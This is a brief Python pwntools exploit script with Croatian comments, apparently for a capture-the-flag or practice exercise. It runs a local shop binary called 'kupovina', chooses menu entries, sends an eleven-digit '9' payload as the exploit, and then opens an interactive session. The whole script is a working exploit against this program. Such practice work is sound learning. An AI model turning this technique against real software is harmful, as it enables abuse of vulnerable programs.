



```
from pwn import *

io = process("./kupovina") #da možemo slati i primati podatke od procesa
elf = ELF("./kupovina") #omogućava pwn tools da može pročitati gdje su adrese funkcija

# = = = START

print(io.recvuntil(b"Odabir:")) #pricekaj ovaj output
#b ispred stringa veli pythonu da on to tretiura kao bytove, jer python ima neke druge UTF-8 stringove

io.sendline(b"3") #biranje opcije 3

print(io.recvuntil(b"Odaberite stvar koju zelite kupiti (0 za izlaz):")) 
io.sendline(b"5") #biranje opcije 3

payload = b""
payload += b"9" * 11

# = = = END

io.sendline(payload) #slanje exploita
print(payload)

io.interactive(); #prebacuje stdin i stdout na standardni ulaz i izlaz, vraća kontrolu korisniku (terminalu)

```